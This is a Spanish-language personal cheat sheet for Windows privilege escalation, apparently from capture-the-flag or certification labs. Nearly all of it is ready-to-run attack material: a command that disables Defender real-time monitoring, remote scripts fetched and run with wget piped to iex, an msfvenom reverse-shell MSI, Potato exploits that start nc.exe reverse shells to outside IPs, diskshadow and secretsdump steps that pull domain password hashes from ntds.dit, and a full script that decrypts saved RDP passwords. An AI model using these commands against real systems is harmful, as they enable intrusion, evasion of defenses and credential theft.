
- Buscar Flag:

```bash
Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue -Force
```

- Buscar info
```bash
paste -sd, users | sed 's/[^,]*/"&"/g'

#Luego

Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.ym  
l,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName  
-notmatch '(C:\\Windows|C:\\Windows\\System32\\|C:\\Documents and Settings\\All Users\\|C:\\Documents and Settings\\Brian\\|C:\\Users\\eknight\\AppData\\Local\\Microsoft\\Windows\\|C:\\Documents and Settings\\eknight\\|C:\\Documents and Settings\\|C:\\Program Files\\Common Files\\|C:\\Program Files\\WindowsApps\\|C:\\Program Files\\Windows Defender Advanced Threat Protection\\|C:\\Program Files\\Windows NT\\)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=",  
"lbennett","administrator","David","RAS","Matt","mjohnson","egreen","spatel","dreyes","nflores","clee","otran","zmiller","mro  
ss","twest","eknight","mthompson"
```

- Buscar archivos:

https://github.com/alessandroz/lazagne

https://github.com/SnaffCon/Snaffler/releases/tag/1.0.244

```bash
.\Snaffler.exe -s -o C:\Windows\Temp\snaffler.log -i C:\
```

- Quitar busqueda de virus
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```


# Lanzar Scripts

```bahs
wget -useb 10.0.0.128/PowerUp.ps1| iex; Invoke-AllChecks


wget -useb 10.0.0.128/PrivescCheck.ps1| iex; Invoke-PrivescCheck


powershell.exe -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

- Ver usuarios disponibles
```powershell
net user

tree /f /a

net localgroup "Remote Management Users"
```

- Ver carpetas ocultas en C:/ u otras
```powershell
dir -Force
```

- Probar con winpeas
```powershell
cd C:/Windows/Temp
mkdir elevate

upload Winpeasx64.exe
```

- Leer historico Powershell
```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```


- Descargar
```powershell
certutil.exe -f -urlcache -split http://10.10.14.20/WinPeas.exe Winpeas.exe
```

	## always Install elevated


```bash
msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=10.10.14.10 LPORT=1234 -f msi -o bad.msi

msiexec /quiet /qn /i C:\windows\temp\a\bad.msi
```


## SeImpersonatePriv

```bash
https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe

.\PetitPotato.exe 3 "whoami"

#. I used a CLSID sourced from **Ohpe’s GitHub repository** (link) specifically for Windows Server 2008 R2 Enterprise, which is known to grant **SYSTEM** privileges.

.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\priv\nc.exe -e cmd 172.16.1.100 8081"


.\Juicy.Potato.x86.exe -t * -p shell.exe -l 1338 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}

\GodPotato-NET4.exe -cmd "C:\windows\temp\a\nc.exe -e cmd 192.168.45.181 777"
```

## SeBackupPriv

```bash
robocopy /b C:\Users\Administrator\Desktop\ C:\
```

- Si esta encriptado
```bash
https://github.com/k4sth4/SeBackupPrivilege

import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
```
- haces un archivi llamado `diskshadow.txt`
```bash
set context persistent nowriters 
set metadata c:\Windows\Temp\c.cab 
add volume c: alias r1pfr4n 
create 
expose %r1pfr4n% x:
```

- Tambien guardas el system y lo descargar en local
```bash
reg.exe save hklm\system system.save
```

- Abusas el diskshadow
```bash
diskshadow.exe /s diskshadow.txt

robocopy /b x:\Windows\NTDS\ . ntds.dit
```

- Sacas los datos
```bash
secretsdump.py -system system.save -ntds ntds.dit LOCAL

secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL -just-dc-ntlm
```


## SeManageVolumeExploit  -> SeChangeNotifyPrivilege
Cuando este activado el SeChangeNotifyPrivilege y tambien este como permiso el SeManageVolumeExploit.

```bash
https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
```
Ejecutas el EXE
## RDP SCAR DATA

- Crear el ps1 y ejecutar
```bash
decrypt.ps1 archivo.rdp
```

```bash
<#
    .SYNOPSIS
        A PowerShell script to decrypt passwords from rdp files
    .DESCRIPTION
        A PowerShell script to decrypt passwords from rdp files
    .PARAMETER rdpfile
        rdp file
#>
[CmdletBinding()]
Param(
  [Parameter(Mandatory=$true,Position=1)][alias("f")][string]$rdpfile=""
)

if(-not (Test-Path $rdpfile))
{
    write-warning ("File {0} not found!" -f $rdpfile)
    exit 2
}

[string]$sUserName=$null
[string]$sDomain=$null
[string]$sEncryptedPass=$null
[string]$sPass=$null

# Read RDP File
$sFileContent=Get-Content $rdpfile
foreach($sLine in $sFileContent)
{
    if($sLine.StartsWith("username:s:"))
    {
        $sUserName=$sLine.Replace("username:s:","")
    }
    elseif($sLine.StartsWith("domain:s:"))
    {
        $sDomain=$sLine.Replace("domain:s:","")
    }
    elseif($sLine.StartsWith("password 51:b:"))
    {
        $sEncryptedPass=$sLine.Replace("password 51:b:","")
    }
}
# Check Input
if(!$sUserName)
{
    write-warning "No username found!"
    exit 2
}
if(!$sEncryptedPass)
{
    write-warning "No encrypted password found!"
    exit 2
}
if($sUserName.IndexOf("\") -lt 0 -and  $sDomain)
{
    $sUserName="{0}\{1}" -f $sDomain,$sUserName
}


[System.reflection.assembly]::LoadWithPartialName("System.Security") | out-null

$iBytes=$sEncryptedPass.Length/2
[byte[]]$aEncryptedPasswordBytes = New-Object -TypeName byte[] $iBytes
for ($i = 0; $i -lt $iBytes; $i++) {
    $aEncryptedPasswordBytes[$i] = [System.Convert]::ToByte($sEncryptedPass.Substring($i*2,2), 16)
}
[byte[]]$passwordAsBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($aEncryptedPasswordBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$sPass=[System.Text.Encoding]::Unicode.GetString($passwordAsBytes)

write-host ("{0,-16} : {1}" -f "UserName",$sUserName)
write-host ("{0,-16} : {1}" -f "Password",$sPass)
```
